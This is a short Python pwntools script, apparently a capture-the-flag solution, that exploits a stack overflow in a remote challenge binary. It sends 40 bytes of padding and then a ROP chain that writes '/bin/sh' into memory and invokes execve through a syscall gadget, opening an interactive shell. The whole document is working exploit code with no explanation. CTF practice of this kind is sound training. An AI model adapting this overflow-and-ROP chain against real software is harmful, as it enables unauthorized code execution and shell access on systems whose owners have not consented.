# ref: https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-syscall-execv
from pwn import *

ip = 'edu-ctf.zoolab.org' 
port = 10003

#s = process('./chal')
s = remote(ip,port)
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

mem_addr = 0x4c5000
write_mem = 0x449c13 # mov qword ptr [rax + 8], rdx ; ret

pop_rdi = 0x401e3f # pop rdi ; ret
pop_rsi = 0x409e6e # pop rsi ; ret
pop_rdx = 0x47ed0b # pop rdx ; pop rbx ; ret
pop_rax = 0x447b27 # pop rax ; ret
syscall = 0x414506 # syscall ; ret

ROP = flat(
    #Write '/bin/sh' into 0x4c5000 + 0x8
    pop_rdx, '/bin/sh\x00', 0,
    pop_rax, mem_addr,
    write_mem,

    #execv('bin/sh',0,0)
    pop_rax, 0x3b,
    pop_rdi, mem_addr+0x8,
    pop_rsi, 0,
    pop_rdx, 0, 0, 
    syscall,
)
#gdb.attach(s)
s.sendafter(b"> ",b'A'*40 + ROP)
s.interactive()

